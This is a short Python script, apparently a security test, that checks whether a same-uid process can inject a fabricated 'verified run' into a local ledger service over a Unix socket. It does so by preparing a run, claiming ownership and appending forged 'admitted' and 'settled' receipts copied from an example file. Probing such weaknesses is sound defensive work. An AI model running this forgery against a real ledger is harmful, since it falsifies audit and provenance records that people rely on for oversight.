#!/usr/bin/env python3
"""Ledger fabrication test: can a same-uid process inject a fake verified run?

Prereq: the checked-in example receipt at
  docs/specs/jail-v1/examples/receipt-prepared.json
Exported to EXAMPLE_RECEIPT below verbatim.

Usage: forge_ledger.py <serve.sock> <example-receipt.json>
"""
import json, socket, sys, hashlib, struct

sock_path = sys.argv[1]
example = json.load(open(sys.argv[2]))

def call(req):
    s = socket.socket(socket.AF_UNIX)
    s.connect(sock_path)
    body = json.dumps(req).encode()
    s.sendall(struct.pack(">I", len(body)) + body)
    hdr = b""
    while len(hdr) < 4:
        c = s.recv(4 - len(hdr))
        if not c:
            raise EOFError("no frame header")
        hdr += c
    n = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < n:
        buf += s.recv(n - len(buf))
    s.close()
    return json.loads(buf)

rid = "req_forged0001"
payload = {
    "schema": "ukai.ledger.request/1",
    "profile": "tool",
    "argv_digest": example["argv_digest"],
    "policy_digest": example["policy"]["digest"],
    "requirements": example["policy"]["requirements"],
    "jail_image_digest": example["argv_digest"],
    "io": {"mode": "batch", "pty": False},
    "capture": {"streams": [], "limit_bytes": 1048576},
    "evidence": "strict",
}

r = call({"op": "prepare", "request_id": rid, "payload": payload})
print("prepare:", json.dumps(r)[:220])
value = r.get("value") or {}
run_id = value.get("run_id") or value.get("run", {}).get("run_id")
att = value.get("attempt_id") or value.get("run", {}).get("attempt_id")
if not run_id:
    sys.exit("no run id: " + json.dumps(r)[:400])
print("run_id:", run_id, "attempt:", att)

r = call({"op": "claim_owner", "run_id": run_id})
print("claim_owner:", json.dumps(r)[:200])
token = (r.get("value") or {}).get("owner_token") or ""

receipt = dict(example)
receipt["attempt_id"] = att  # bind to the fabricated run
r = call({"op": "append_owner", "run_id": run_id, "request_id": "own1", "kind": "admitted",
          "effect_id": None, "body": {"receipt": receipt}, "token": token})
print("admitted:", json.dumps(r)[:400])

# settle with a real-jail shape: phase -> settled, outcome exited 0
receipt2 = dict(receipt)
receipt2["phase"] = "settled"
r = call({"op": "append_owner", "run_id": run_id, "request_id": "own2", "kind": "settled",
          "effect_id": None, "body": {"receipt": receipt2}, "token": token})
print("settled:", json.dumps(r)[:400])

r = call({"op": "show", "run_id": run_id})
print("show:", json.dumps(r)[:500])
